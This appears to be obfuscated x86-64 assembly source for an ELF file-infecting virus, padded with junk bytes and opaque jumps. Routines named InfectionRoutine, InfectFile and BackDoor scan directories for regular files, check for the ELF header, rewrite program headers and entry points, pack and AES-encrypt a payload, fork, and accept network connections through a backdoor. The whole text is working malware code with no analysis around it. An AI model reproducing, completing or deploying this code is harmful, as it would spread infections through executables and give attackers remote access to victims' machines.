    jmp         ..@Sk7hy1eOe4M2
..@vRdd0eP2oC9i:
    mov         r1, rax
    xor         r2, r2
    jmp         $+3
db 0x62
    jmp         ..@eandJYTC06oy
..@Rw5ZLkZr9ujD:
    cmp         rax, 0xffffffffffffffff
    je          ..@5V6OC7Le1QBK
    jmp         $+4
db 0x74, 0xc0
    je          ..@I3prJZJqa8Xm
    jne         ..@I3prJZJqa8Xm
..@VLNmrVu8Qy2l:
    push        r4
    jl          ..@T4ycKT1rpiVn
    jge         ..@T4ycKT1rpiVn
..@1zqJF0DloWJb:
    mov         r1, r5
    mov         r3, _signature.startsize
    call_vsp    Strncmp
    jmp         $+4
db 0xf6, 0x16
    je          ..@ZiOHNFE7J2HS
    jne         ..@ZiOHNFE7J2HS
..@UjqNG9wkxOP1:
    sub         ax, WORD [rsp+_LZSSE_OFF.la_index]
    mov         edx, LOOKAHEAD_LENGTH
    js          ..@UcDzNArLAlKl
    jns         ..@UcDzNArLAlKl
InfectionRoutine:
    jmp         ..@kfMrVDl9zF61
..@N4tSmDPTo68F:
    RFILE       rax, [rsp+_PROC_OFF.buffer], 0x100
    cmp         rax, 0x00
    jmp         $+5
db 0x82, 0x11, 0xc7
    js          ..@tEn8ftZFd0n3
    jns         ..@tEn8ftZFd0n3
..@kfMrVDl9zF61:
    mov         QWORD m5, 0x01
    jmp         $+3
db 0x14
    jmp         ..@sn9raep3hdTF
..@aIsLG8qjRDVI:
    xor         r4, r4
    mov         r4d, DWORD [r1 + file.filefd]
    jmp         ..@hQO7OQspVpRn
..@JxPQLTm4204M:
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    xor         rax, rax
    mov         ax, WORD [rsp+_LZSSE_OFF.buffersize]
    jl          ..@ZHRezlBpTkWE
    jge         ..@ZHRezlBpTkWE
..@DeVBLAA40ITk:
    xor         rdx, rdx
    mov         bl, BYTE [rsp+_LZSSE_OFF.character]
    mov         edx, 100000000b
    jmp         $+4
db 0x48, 0xf3
    jmp         $+4
db 0x2b, 0xe2
    jmp         ..@pRqdxtbGD4wD
..@45EBZCxZ5b8s:
    movdqu      xmm1, oWORD [rsp+0x90]
    js          ..@Lr3D6YCBgNbL
    jns         ..@Lr3D6YCBgNbL
..@Lqn9g2i6tzBK:
%ifdef X86_32
    mov         edx, 11b
%endif
    jmp         $+4
db 0xd2, 0x80
    jmp         $+4
db 0x73, 0xb5
    jmp         $+4
db 0xd5, 0x88
    jmp         ..@VWIfj0Ef8F2o
..@QCpd4uZjkw0P:
    lea         r3, [rsp+_PAYLOAD_OFF.key]
    jmp         $+4
db 0x94, 0x09
    jb          ..@H2t23NSawgqm
    jae         ..@H2t23NSawgqm
..@o5ZIuqwuwZ33:
    cmp         eax, 0x3
    jl          ..@4jJo0Jm9rdUZ
    jge         ..@4jJo0Jm9rdUZ
..@3vfYZQF1Sa9X:
    CFILE       DWORD [r5+file.filefd]
    jmp         $+4
db 0x86, 0x57
    jmp         ..@5nos5Ui09qPo
..@Nojq44te8b2h:
    xor         rax, rax
    jmp         ..@Pi9il7D8vvw0
..@Wuzn7tCQgJ5A:
    mov         r3, r2
    jmp         ..@VLXZwAjLLi0U
..@9X3pwXO9vrKq:
    xor         r2, r2
    xor         r3, r3
    mov         r1d, eax
    jmp         $+4
db 0x10, 0x83
    jmp         ..@LVpY1clpA6UL
..@q1NYVcJ9H3DV:
    pop         r5
    jl          ..@sAoDzVPPxsKt
    jge         ..@sAoDzVPPxsKt
..@3XxOio9FM93e:
    movdqu      xmm1, oWORD [rsp+0x30]
    aesenc      xmm0, xmm1
    jl          ..@Cp82fYtsYw8C
    jge         ..@Cp82fYtsYw8C
..@Yo4HuCgmiY3o:
    syscall
    jmp         $+5
db 0xf1, 0xc8, 0x98
    jb          ..@2Am7vvaKsnEt
    jae         ..@2Am7vvaKsnEt
InfectFile:
    jmp         ..@q9t6AEdf2ugF
..@kwCpyPK00bPG:
    rep         stosb
    jmp         $+5
db 0x7f, 0x38, 0xa0
    jmp         $+4
db 0x1c, 0xe3
    je          ..@JEsPfrtotIMX
    jne         ..@JEsPfrtotIMX
..@WhULtkXr0I47:
    mov         rdi, QWORD [rsp+_LZSSE_OFF.outputaddr]
    jmp         $+3
db 0xdb
    jmp         ..@zymOeYpooDw8
..@ZHRezlBpTkWE:
    add         rdi, rax
    jmp         ..@ehGEMCkeA72T
..@OOH6EC9cwl8H:
%ifndef ENABLE_DEBUGGING
    syscall
    xor         rax, rax
    xor         r4, r4
%endif
    jmp         $+3
db 0x79
    jb          ..@Qsh1vhjc82i2
    jae         ..@Qsh1vhjc82i2
..@TDtEs2bxGR0J:
%ifndef ENABLE_DEBUGGING
    xor         r2, r2
%endif
    js          ..@eXbDju9GzUe8
    jns         ..@eXbDju9GzUe8
..@2JWkyf69HcLc:
    jmp         ..@kUzayClRhg3e
    jmp         ..@kVgkm7UZZICU
..@GbqJketTYVfX:
    add         QWORD [rsp+_PROC_OFF.dirindex], rax
    add         r4, rax
    jmp         $+5
db 0x21, 0x62, 0xbc
    jmp         $+4
db 0x84, 0x4e
    jmp         ..@26npGSyeVEvR
..@IzGteyu0sii7:
    VAR         packed, dirs_root
    jmp         ..@E2I4fQWwweme
    jmp         $+3
db 0x2a
    js          ..@JYAsialzZ1qB
    jns         ..@JYAsialzZ1qB
..@FLl70UTRk2oq:
    add         r3, r5
    jmp         ..@9GLuwaQ8xJ6m
..@0yF5Yu6DxtQi:
%ifdef X86_64
    xor         r9, r9
    mov         rsi, QWORD [r8+file.filesize]
    mov         edx, r10d
%endif
    jmp         $+5
db 0xfc, 0x74, 0x66
    jl          ..@RycmVVyJdcBn
    jge         ..@RycmVVyJdcBn
..@qOTRZJLnmRvk:
    mov         r1, QWORD [rsp+_INFFILE_OFF.file+file.fileptr]
    add         r1, QWORD [rsp+_INFFILE_OFF.file+file.filesize]
    sub         r1, r4
    jl          ..@1dE4xkmcAvM6
    jge         ..@1dE4xkmcAvM6
..@UuBHt6vu6Igq:
    sub         rsp, _PROC_OFF_size
    jmp         $+4
db 0xfa, 0x11
    je          ..@q54VWwCXIqXu
    jne         ..@q54VWwCXIqXu
..@ebfKTHMHODNY:
    call        MapFile
    jmp         $+5
db 0x57, 0x0b, 0x92
    jmp         $+5
db 0xa9, 0xa7, 0xe0
    jmp         $+3
db 0x09
    jmp         ..@RyCRrqged7Af
..@jsWzDGWNXoJP:
    test        ax, ax
    jmp         $+5
db 0xf1, 0x0a, 0x64
    jb          ..@ttpuscEZiuva
    jae         ..@ttpuscEZiuva
..@z6jf6Izpjqtj:
%ifndef ENABLE_DEBUGGING
    xor         r1, r1
    xor         r2, r2
%endif
    js          ..@pTpsHdQLSgvM
    jns         ..@pTpsHdQLSgvM
..@KaOHn9Pui7kt:
    syscall
    jmp         $+3
db 0xe7
    jmp         ..@iknvE3Xz3MAy
..@vVL0pR0dt8JC:
%ifdef X86_32
    mov         edx, esi
    mov         esi, 0x01
%endif
    jmp         $+4
db 0x09, 0x05
    jmp         $+4
db 0x20, 0x69
    jmp         ..@bqqYB0W6vJBt
..@u05ofSk6jFJd:
    mov         rsi, QWORD [rsp+_AESE_OFF.startaddr]
    jl          ..@Ck8Hg0xJL4xE
    jge         ..@Ck8Hg0xJL4xE
..@04GWVz4EPLkB:
    add         r4, r3
    xor         r2, r2
    mov         r2w, WORD [r1+e_h.e_phnum]
    jmp         $+4
db 0xc0, 0x82
    jb          ..@mS4ulNVPwumd
    jae         ..@mS4ulNVPwumd
..@9sJvDdp6TL9j:
    jmp         ..@hnV5Rax65Fqi
    jmp         $+4
db 0x0e, 0xc9
    jl          ..@shWJQl1jTUDr
    jge         ..@shWJQl1jTUDr
..@NDyewVNcFu7v:
    mov         r2, m7
    js          ..@esPHhK4Ul3WS
    jns         ..@esPHhK4Ul3WS
..@8GfVvutbZuDg:
    add         rax, rbx
    jmp         $+4
db 0x44, 0xb4
    jmp         ..@fneT9V2mvB7k
..@FOVBxWD1DWnD:
    mov         DWORD [r5+file.filefd], eax
    jb          ..@paNfDpCaUXgs
    jae         ..@paNfDpCaUXgs
..@Hypn0Q7hDakc:
    cmp         bx, WORD [rsp+_LZSSE_OFF.w_index]
    jmp         $+3
db 0xd6
    jmp         $+5
db 0x2a, 0x02, 0x51
    jmp         ..@AhhFvXx0bnFJ
..@0IIp2OWi53CV:
    mov         r2, r1
    add         r1, signature_len
    mov         r3, QWORD [r5+file.filesize]
    jmp         ..@4bHRIkrc6R1U
..@r3otnGackPjn:
    add         rax, QWORD [rsp+_VADDR_OFF.tmp_offset]
    jmp         ..@od2lbyvZPfHQ
..@4ARbOg08pFGt:
    shr         dx, 0x4
    jmp         $+4
db 0xef, 0x29
    je          ..@A9on1tQ51sfP
    jne         ..@A9on1tQ51sfP
..@sGrVZVva3l0X:
    call        MapFile
    jmp         ..@w3BIvcpTd9NM
..@4wlDrouzmB9K:
    aesenc      xmm0, xmm1
    jb          ..@XAElEK2qZV9B
    jae         ..@XAElEK2qZV9B
..@ShDUZTk4U50q:
    cmp         BYTE [rsp+_LZSSE_OFF.character], al
    jmp         $+5
db 0xff, 0xa3, 0x93
    jl          ..@Yg5ftdBp9QE9
    jge         ..@Yg5ftdBp9QE9
..@ON5Srlwp6ots:
    mov         ecx, signature_len
    rep         movsb
    xor         rax, rax
    jb          ..@6Ixe87rPAgxC
    jae         ..@6Ixe87rPAgxC
..@K7jeTnO6ApTV:
    add         rdi, 0x4
    jmp         $+5
db 0xcb, 0x61, 0xde
    js          ..@LUMndREwqJLe
    jns         ..@LUMndREwqJLe
..@keYjBNXVMdwe:
    jge         ..@8Zbim95BRIkP
    jmp         ..@k0YEwu3BaFaP
..@hQO7OQspVpRn:
    mov         r5, r1
    js          ..@ISd686tiOj4c
    jns         ..@ISd686tiOj4c
..@7Eq33EZKbBJw:
%ifndef ENABLE_DEBUGGING
    cmp         r2b, 0x0
%endif
    jl          ..@Z7LQ8HuwKBBj
    jge         ..@Z7LQ8HuwKBBj
..@ydjfS0ZNnRli:
    cmp         rax, r2
    jmp         $+3
db 0x65
    jmp         $+3
db 0x1f
    jl          ..@t4F84pLU5D4a
    jge         ..@t4F84pLU5D4a
..@8seXsK1ZcJhb:
    mov         rax, 1
    jmp         $+3
db 0x97
    jmp         $+3
db 0x9e
    jmp         ..@qoMMp3vT2alA
..@qJjNeO3wNMUT:
    ret
    jmp         $+5
db 0x9b, 0x4b, 0xb4
..@shWJQl1jTUDr:
    xor         rax, rax
    jl          ..@V3LyOSiF9CYY
    jge         ..@V3LyOSiF9CYY
..@t4F84pLU5D4a:
    jne         ..@bfVM4E4yJI4L
    xor         rax, rax
    jmp         $+4
db 0xe9, 0xea
    jmp         ..@OS46U6wShd68
..@Q3IJyqmIOeaY:
    movzx       rax, BYTE [rsp+_PROC_OFF.dirbuf+linux_dirent.d_reclen+r4]
    jmp         ..@GbqJketTYVfX
..@1dE4xkmcAvM6:
    call        MemMove
    inc         WORD m5
    jl          ..@xahXfUCVqguQ
    jge         ..@xahXfUCVqguQ
..@8uj3mVg8sF3h:
    mov         r5, QWORD [r4+rax+p_h.p_vaddr]
    add         r5, QWORD [r4+rax+p_h.p_memsz]
    cmp         r5, QWORD [rsp+_VADDR_OFF.tmp_vaddr]
    je          ..@t0WbCroNHGvz
    jne         ..@t0WbCroNHGvz
..@r52AMFin7D1u:
    xor         rcx, rcx
    jmp         ..@IVoUfg0Uj2f3
..@mKccUaDkNFmj:
    mov         r5, QWORD [r1+file.fileptr]
    jmp         $+5
db 0xbf, 0xaa, 0x7f
    jb          ..@hkVdkoFkabO2
    jae         ..@hkVdkoFkabO2
..@l6fcbIdMX9BN:
    cmp         BYTE [r5], DT_REG
    jmp         $+3
db 0x48
    jmp         ..@IwtGvwJe0zHb
..@Eim7CQrJGOYU:
    add         ecx, 1
    jmp         $+5
db 0xad, 0x9b, 0xd7
    jl          ..@AvWN57M8AVop
    jge         ..@AvWN57M8AVop
..@FgcM2CryZLgi:
    movzx       rax, BYTE [r2]
    js          ..@H1Ia6DDyidL1
    jns         ..@H1Ia6DDyidL1
..@PfL7PbrDgOTa:
    mov         r5, [rsp]
    jmp         $+3
db 0x64
    jmp         ..@FOVBxWD1DWnD
..@Uz3Ys1Ilxt6T:
    mov         BYTE [r1], 0x00
    jmp         $+3
db 0x9a
    js          ..@6SNcD7e20iLY
    jns         ..@6SNcD7e20iLY
..@4C5cjHoCE9sV:
    jl          ..@ERlMWnp5ZKgL
    jmp         $+3
db 0x3f
    jmp         ..@r52AMFin7D1u
..@rXdLlWgUOASc:
    jmp         ..@TxA4xx7jqOJz
    jmp         ..@RwzwiGMb79T0
..@OxFw1VpntzaZ:
    je          ..@9EZ4PsXPjqTU
    mov         rax, SYS_FORK
    jmp         $+3
db 0xfe
    jmp         ..@Yo4HuCgmiY3o
DYNPIEValidation:
    jmp         ..@VqLOzQ84fSd0
..@LgkSukGibuol:
%ifdef X86_32
    pop         ebp
%endif
    jmp         $+5
db 0x0e, 0x5d, 0x3d
    js          ..@ztGvitWaDAJT
    jns         ..@ztGvitWaDAJT
..@0SMFHLSsJnNF:
    sub         WORD [rsp+_LZSSE_OFF.la_index], WINDOW_LENGTH
    sub         WORD [rsp+_LZSSE_OFF.w_index], WINDOW_LENGTH
    jmp         $+4
db 0xed, 0x02
    jmp         $+3
db 0x42
    jmp         ..@nVUGSBP2q2MX
..@Fd6hHAgyoyyA:
    xor         rax, rax
    jmp         $+5
db 0x04, 0x29, 0x25
    jmp         $+5
db 0x79, 0x6d, 0x57
    js          ..@TxLiJiEWJJDa
    jns         ..@TxLiJiEWJJDa
..@QkeVNhmSa3zk:
%ifndef ENABLE_DEBUGGING
    jl          ..@gMdfoIlYoobW
%endif
    jmp         $+5
db 0xab, 0x20, 0x27
    js          ..@jRI6wcc2yn1E
    jns         ..@jRI6wcc2yn1E
..@fp9eZhDIfPGd:
    cmovg       ecx, DWORD [rsp+_LZSSE_OFF.length]
    sub         QWORD [rsp+_LZSSE_OFF.length], rcx
    lea         rdi, QWORD [rsp+_LZSSE_OFF.buffer+WINDOW_LENGTH-LOOKAHEAD_LENGTH]
    jmp         $+4
db 0x11, 0xa2
    jmp         $+3
db 0x43
    jmp         $+4
db 0x61, 0x10
    jl          ..@rv9SFBVslfCY
    jge         ..@rv9SFBVslfCY
..@9GLuwaQ8xJ6m:
    mov         r4, r3
    jmp         $+5
db 0xac, 0x7e, 0xdc
    jb          ..@efZhmtJzD37B
    jae         ..@efZhmtJzD37B
..@ApIknvEJwJIw:
    call        DYNPIEValidation
    jmp         $+3
db 0x96
    jb          ..@9ODRTBTdylMk
    jae         ..@9ODRTBTdylMk
..@jUhbzrTBPzgU:
    test        r2, r2
    jnz         ..@bYBwyrVMkoY7
    je          ..@jKJAzX7nW3ib
    jne         ..@jKJAzX7nW3ib
..@Uw90v548leUl:
    jmp         Strcpy
    jmp         $+5
db 0xf6, 0x5e, 0x54
    jmp         $+3
db 0xcb
    jmp         ..@qJjNeO3wNMUT
..@NrRy1Lmc4qQA:
    mov         dl, BYTE [rsp+_LZSSE_OFF.cmp_len]
    jmp         $+4
db 0x49, 0xec
    jmp         $+3
db 0x0a
    jmp         ..@QjSuW5SS47XX
..@BacsqXzCGNmY:
    call_vsp    Strlen
    jmp         $+3
db 0x5a
    jmp         $+3
db 0x7a
    jmp         $+3
db 0x0c
    jmp         $+4
db 0xea, 0x6f
    jmp         ..@AHIvu7cS21oK
..@ocOJbrN16luh:
    jne         ..@l6fcbIdMX9BN
    jmp         ..@Dm5KmVczNGaY
..@T4ycKT1rpiVn:
    push        r5
    jmp         $+4
db 0x3a, 0xbb
    jmp         $+5
db 0x26, 0x0c, 0x09
    jmp         ..@aIsLG8qjRDVI
..@qToYmvRCbfhA:
    xor         rdx, rdx
    lea         rdi, [rsp+_LZSSE_OFF.buffer]
    mov         rsi, rdi
    jmp         $+3
db 0x9e
    jb          ..@7pZGElN4FBdz
    jae         ..@7pZGElN4FBdz
..@QtJCNblwH9Ce:
    mov         rax, 2
    jmp         $+5
db 0x08, 0x56, 0xaf
    jmp         ..@OQmgS389TDyp
..@TyBU4NpvDWs7:
    ODIR        [rsp+_INFDIR_OFF.dirfd], [rsp+_INFDIR_OFF.dirbuf], DIRENT_BUFSIZE
    cmp         rax, 0x00
    jmp         $+4
db 0x79, 0x02
    jmp         ..@aD8a0wBUvMwx
..@aOWzzOC9Mxff:
    lea         r1, [rsp+_PROC_OFF.buffer]
    jmp         $+4
db 0xdf, 0x83
    jmp         $+3
db 0xaf
    jmp         ..@RJPqX7B5Tf2R
..@CXhscSmKAXDO:
    mov         QWORD [r5+file.filesize], 0x00
    jl          ..@ZjLa5WY9jKdJ
    jge         ..@ZjLa5WY9jKdJ
..@nj3OY9mz86fQ:
    mov         r2, QWORD [r1+e_h.e_entry]
    jmp         $+4
db 0x65, 0xe5
    je          ..@15pKed6QuU9u
    jne         ..@15pKed6QuU9u
..@f3yXa3lw5ZxY:
    jmp         ..@pwEsT9P2a0Ko
    je          ..@YRbIEf0rQTJ0
    jne         ..@YRbIEf0rQTJ0
..@WrhLu5DISHkK:
    mov         rdi, QWORD [rsp+_UPDATASIG_OFF.signaddr]
    add         rdi, _signature.index-_signature.start
    mov         DWORD [rdi], eax
    jmp         ..@2g76VzwZFsBO
..@XS7E8ArKRG6G:
    shr         BYTE [rsp+_LZSSE_OFF.mask], 1
    mov         al, BYTE [rsp+_LZSSE_OFF.mask]
    test        al, al
    jmp         $+4
db 0x17, 0x59
    js          ..@AcZuzGaXihjp
    jns         ..@AcZuzGaXihjp
..@b9czsxQuGhcQ:
%ifndef ENABLE_DEBUGGING
    cmp         al, 0x0
%endif
    jmp         $+5
db 0xe0, 0x8a, 0xd4
    jl          ..@q6MQNBHFPSYH
    jge         ..@q6MQNBHFPSYH
..@zw1ffNvtsDdO:
    add         eax, 0x30
    jmp         $+5
db 0xe5, 0xb0, 0xbd
    jl          ..@qODQsTwpPvV4
    jge         ..@qODQsTwpPvV4
..@MtuwVjrLiTFn:
    pop         r2
    jb          ..@gek4EpzLKrhE
    jae         ..@gek4EpzLKrhE
..@syCZbIhAvCWy:
    pop         r2
    pop         r5
    jmp         $+5
db 0x74, 0x23, 0x03
    jmp         $+3
db 0xfe
    jmp         ..@gtt0fxkXtw6U
..@wVzdo6sGLVOf:
    mov         QWORD [r2+p_h.p_align], PAGE_SIZE
    jmp         $+4
db 0xc9, 0xe3
    jmp         ..@tvoLh5y1XEmp
MemMove:
    jmp         ..@v8RFzZ9fQ1d3
..@hQ9ky4Eba5oh:
    mov         r2, m6
    jmp         $+5
db 0x86, 0xff, 0xfa
    js          ..@qOTRZJLnmRvk
    jns         ..@qOTRZJLnmRvk
..@uKychaaTbWIW:
    jmp         ..@HQv7bZVpoYP7
    jmp         ..@zw1ffNvtsDdO
..@AcZuzGaXihjp:
    jnz         ..@VJeEIuEaTg6z
    jmp         $+5
db 0xe1, 0x86, 0x56
    jmp         $+3
db 0x3f
    jmp         ..@qa9HoFX9mW7H
..@yyG3ohBDOe5u:
    jle         ..@hnV5Rax65Fqi
    js          ..@hXKkcpHCEcm6
    jns         ..@hXKkcpHCEcm6
..@b9ngManeWEQO:
    call        Strcpy
    mov         BYTE [r1], 0x00
    jmp         $+4
db 0x2f, 0x1f
    jmp         ..@AXVEgBOKlsP9
..@mkFPE9WzU7bw:
    xor         r2, r2
    jmp         $+3
db 0x9a
    jmp         ..@fng00RihBDIt
..@obuyMCjClNKw:
    xor         rax, rax
    xor         rbx, rbx
    jmp         ..@ssY5GXYnQjHi
..@VwwxMuLRc97U:
    lea         r1, [rsp+_INFFILE_OFF.file]
    jmp         $+5
db 0xc4, 0x15, 0x0b
    jb          ..@HRInWx41s0zE
    jae         ..@HRInWx41s0zE
..@YfWNskEn8Rrd:
    jl          ..@ZE5uZVA1Y0jt
    pop         rax
    mov         rax, rdi
    jmp         $+4
db 0xab, 0x8a
    jmp         ..@5alerKh1SVpT
..@EV58ycjU5KXi:
    je          ..@oXrCgCFuzwqN
    mov         r3, r4
    jb          ..@hQ9ky4Eba5oh
    jae         ..@hQ9ky4Eba5oh
..@PxNIl5NbLF5s:
    mov         r2, m5
    jmp         $+3
db 0xdc
    jmp         ..@k0SllQJfUSxN
..@8QAXba70U4wC:
    CFILE       DWORD [rsp+_PROC_OFF.filefd]
    jl          ..@LYuICe0K3Bpc
    jge         ..@LYuICe0K3Bpc
..@2ZkiYqDTwegt:
%ifdef X86_64
    mov         rcx, rdx
%endif
    jmp         $+4
db 0x39, 0xc8
    jb          ..@BqWbr7cnSCdi
    jae         ..@BqWbr7cnSCdi
..@Eo4x1NZC5hTl:
    pxor        xmm0, xmm1
    jb          ..@hO31Q0DeNCsk
    jae         ..@hO31Q0DeNCsk
..@iQGWnTitAKLa:
    mov         QWORD [rsp+_VADDR_OFF._vaddr], 0
    xor         rax, rax
    mov         r3, [r1+e_h.e_phoff]
    jmp         $+5
db 0x30, 0xec, 0x42
    js          ..@eZPOiUdwZT64
    jns         ..@eZPOiUdwZT64
..@kLBmOIaYnFQP:
    pop         r1
    jmp         $+4
db 0xd9, 0xe5
    js          ..@zNpifSzQmAAA
    jns         ..@zNpifSzQmAAA
..@ys8h4brPPlOE:
    lea         r1, [rsp+_NBF_OFF.key]
    call        KeyGen
    mov         r5, QWORD [rsp+_NBF_OFF.file]
    jb          ..@7P7zbZavLTrc
    jae         ..@7P7zbZavLTrc
..@Cp82fYtsYw8C:
    movdqu      xmm1, oWORD [rsp+0x40]
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0x50]
    jl          ..@Q7WJAqdBMYZ4
    jge         ..@Q7WJAqdBMYZ4
..@Si355ed2dJvv:
    push        r3
    jb          ..@3WpTiOdjFny8
    jae         ..@3WpTiOdjFny8
..@lRq42zc65ooY:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    js          ..@5oFaw3CGqdgX
    jns         ..@5oFaw3CGqdgX
..@tmGri1wDxDnA:
    mov         r5, r1
    jmp         ..@6ZhsDdzuCWIe
..@1BS9aHkerUIg:
    xor         rax, rax
    jmp         $+3
db 0xf6
    jmp         $+4
db 0x58, 0x48
    jmp         ..@oxgETVhpgCBm
..@GGNJT1FonyDI:
    mov         eax, 0x00
    rep         stosb
    lea         r1, [rsp+_PAYLOAD_OFF.key]
    je          ..@ns6TC0XGEGV3
    jne         ..@ns6TC0XGEGV3
..@u6FjMzJlBTfe:
    mov         al, BYTE [rsp+_LZSSE_OFF.match_len]
    and         WORD [rsp+_LZSSE_OFF.match_pos], WINDOW_LENGTH-1
    jb          ..@p1Jx7Otp3fUo
    jae         ..@p1Jx7Otp3fUo
..@GcCyEdDJLwcr:
    test        eax, eax
    jmp         $+5
db 0x5e, 0xa1, 0xd4
    jmp         $+5
db 0xc8, 0x18, 0x62
    jmp         ..@Od9TzH4X9l1F
..@XshW7nV0aep8:
    syscall
    jmp         $+3
db 0x6d
    js          ..@GcCyEdDJLwcr
    jns         ..@GcCyEdDJLwcr
..@1ZOPXUYeuHuU:
    call        UpdateSignature
    jb          ..@EWeUsYnUi659
    jae         ..@EWeUsYnUi659
..@Q9lZU45wAuat:
    cmp         eax, 0x3
    jmp         ..@DTgPxYKKIUC4
..@R8qgjJtpCUsw:
    xor         r1, r1
    xor         r2, r2
    xor         r3, r3
    jmp         $+5
db 0x78, 0xe0, 0xe3
    jmp         ..@PmCsnV07uhko
BackDoor:
    jmp         ..@9rQPC3yod4Kx
..@cI4a54pUS4Ye:
%ifndef ENABLE_DEBUGGING
    xor         r3, r3
    mov         eax, SYS_ACCEPT4
%endif
    jb          ..@GgHCPNTqFBp9
    jae         ..@GgHCPNTqFBp9
..@pMgvKqejkcE7:
    xor         r2, r2
    jmp         $+4
db 0x42, 0x21
    je          ..@VbYwOnHswaMU
    jne         ..@VbYwOnHswaMU
..@nVUGSBP2q2MX:
    mov         ecx, WINDOW_LENGTH*2
    xor         rax, rax
    jb          ..@IjRttg3t6N6O
    jae         ..@IjRttg3t6N6O
..@WSA1qYXYUiNQ:
    xor         r4, r4
    mov         r5, [rsp+_NBF_OFF.file]
    mov         r1, QWORD [r5+file.fileptr]
    jmp         $+5
db 0xf1, 0xef, 0xf9
    jl          ..@7fO5EnKX2Cwh
    jge         ..@7fO5EnKX2Cwh
..@eAK7tYEyZvZV:
    call        GetNewProgramVaddr
    js          ..@ZngbToYDtra8
    jns         ..@ZngbToYDtra8
..@wFC8XXSzHOhP:
    xor         rax, rax
    js          ..@p1ew5CPzQb5v
    jns         ..@p1ew5CPzQb5v
..@oXrCgCFuzwqN:
    call        DestroyPayload
    jmp         ..@iUaD78RveJ6I
..@yvjMFQS03vZr:
    xor         rax, rax
    mov         dx, WORD [rsp] 
    jmp         ..@ZE5uZVA1Y0jt
..@urDk7YLtSv2d:
    cmp         WORD [r1], '..'
    je          ..@qFCKTajb7Cpo
    jmp         $+3
db 0xc9
    jb          ..@3fymNw646lOo
    jae         ..@3fymNw646lOo
..@rf8gwgyVVVPY:
    call        FileValidation
    cmp         rax, 0x02
    je          ..@XdnumjtPN1Lh
    jmp         $+5
db 0x57, 0x3b, 0xe3
    jmp         $+5
db 0x53, 0x6f, 0xd0
    jb          ..@NqzBTsrvPBy1
    jae         ..@NqzBTsrvPBy1
..@Jn7fWBHN6bdC:
    test        al, al
    jmp         $+3
db 0xd2
    jl          ..@RBze8rGWbeK9
    jge         ..@RBze8rGWbeK9
..@2i02cSiJ9Wvr:
    mov         rdi, m6
    jmp         ..@3ZSqvjuz1RkE
..@FF2TbSPbDg1y:
    add         r1, e_h.e_shentsize
    jmp         $+3
db 0xb5
    jmp         $+5
db 0xfc, 0x9d, 0xf0
    js          ..@l0CgLpY5ZTSi
    jns         ..@l0CgLpY5ZTSi
..@W8woZcJ5namE:
    cmp         r4, QWORD [rsp+_INFDIR_OFF.dirnread]
    jl          ..@KCZSptnQ6uy7
    jmp         ..@TyBU4NpvDWs7
    js          ..@JzUHM2gKJgQm
    jns         ..@JzUHM2gKJgQm
..@MUOnXmd9v8v4:
    jne         ..@X9ySHtW3TjNw
    mov         rax, QWORD [rsi+rcx+bytes]
    and         rax, DF_1_PIE
    je          ..@ncFMSAD5MxkL
    jne         ..@ncFMSAD5MxkL
..@0ImD6hvfRinT:
    je          ..@A3CD3lQZQvuJ
    jmp         ..@9GNAMz7532ZD
..@4kqgtB2J7QZs:
    inc         WORD m5
    jmp         $+3
db 0xba
    jl          ..@VwSoBXeuX7fH
    jge         ..@VwSoBXeuX7fH
..@D7pyA1ASEju3:
    xor         rax, rax
    jmp         $+5
db 0x1e, 0xf2, 0x15
    jb          ..@dgRhaOoMVL4z
    jae         ..@dgRhaOoMVL4z
..@xahXfUCVqguQ:
    jmp         ..@oXrCgCFuzwqN
    jmp         $+4
db 0x60, 0xa2
    jmp         $+3
db 0xc1
    js          ..@xFBje5Sfiejf
    jns         ..@xFBje5Sfiejf
..@akTaSm8HoHP8:
    jle         ..@LYuICe0K3Bpc
    mov         DWORD [rsp+_PROC_OFF.filefd], eax
    jmp         $+3
db 0x1f
    jmp         $+5
db 0x5d, 0xec, 0x1b
    jmp         ..@N4tSmDPTo68F
..@ihnflMXV2ZVH:
    xor         rdx, rdx
    jmp         $+4
db 0xd2, 0x58
    jmp         $+3
db 0x96
    jmp         $+4
db 0xd4, 0xa4
    js          ..@u6FjMzJlBTfe
    jns         ..@u6FjMzJlBTfe
..@xvn50FRttLH2:
%ifdef X86_32
    xor         eax, eax
    xor         ebx, ebx
    mov         ecx, DWORD [edi+file.filesize]
%endif
    jb          ..@vVL0pR0dt8JC
    jae         ..@vVL0pR0dt8JC
..@axKVy29EVxj8:
    mov         rsi, rdi
    add         rsi, WINDOW_LENGTH
    rep         movsb
    je          ..@chdJhINwdCFA
    jne         ..@chdJhINwdCFA
..@XAElEK2qZV9B:
    movdqu      xmm1, oWORD [rsp+0xe0]
    jl          ..@Zluej7Xn3I1s
    jge         ..@Zluej7Xn3I1s
..@8Zbim95BRIkP:
    mov         r1, QWORD [r5+file.fileptr]
    cmp         DWORD [r1], 0x464c457f
    jmp         ..@SMLvarKiPtR9
IsNum:
    jmp         ..@1BS9aHkerUIg
..@zDBssteI2QpX:
    mov         DWORD [rsp+_KEYGEN_OFF.fd], eax
    mov         r1d, eax
    mov         r2, QWORD [rsp+_KEYGEN_OFF.bufferaddr]
    jmp         $+3
db 0x5c
    jmp         $+5
db 0x4a, 0x53, 0xdc
    jb          ..@SuRdo1U0SBNO
    jae         ..@SuRdo1U0SBNO
..@6Ixe87rPAgxC:
    xor         r1, r1
    mov         r1w, WORD [rsp+_UPDATASIG_OFF.index] 
    call        WORDToDWORDASCII
    jmp         ..@WrhLu5DISHkK
..@cFR4TyIMxWY7:
    mov         m6, rax
    mov         r1, rax
    jmp         $+5
db 0x38, 0x69, 0x48
    jb          ..@GxCfEmiAaKgr
    jae         ..@GxCfEmiAaKgr
..@2Am7vvaKsnEt:
    cmp         eax, 0x00
    jmp         $+5
db 0xe7, 0x5e, 0x17
    jb          ..@I3e90ChYylnq
    jae         ..@I3e90ChYylnq
..@5alerKh1SVpT:
    ret
    jl          IsNum
    jge         IsNum
..@74OVp6jr9v3h:
    movdqu      xmm1, oWORD [rsp+0xa0]
    aesenc      xmm0, xmm1
    movdqu      xmm1, oWORD [rsp+0xb0]
    jmp         $+5
db 0x72, 0xb4, 0xf1
    jmp         $+3
db 0xa8
    js          ..@70GCaO2vD46J
    jns         ..@70GCaO2vD46J
..@QjSuW5SS47XX:
    sub         dl, cl
    je          ..@ZPNcupEFhfDg
    jne         ..@ZPNcupEFhfDg
..@BXkFpl3DJdd7:
    sub         rsp, _LZSSE_OFF_size
    je          ..@M1exrkL0G5D3
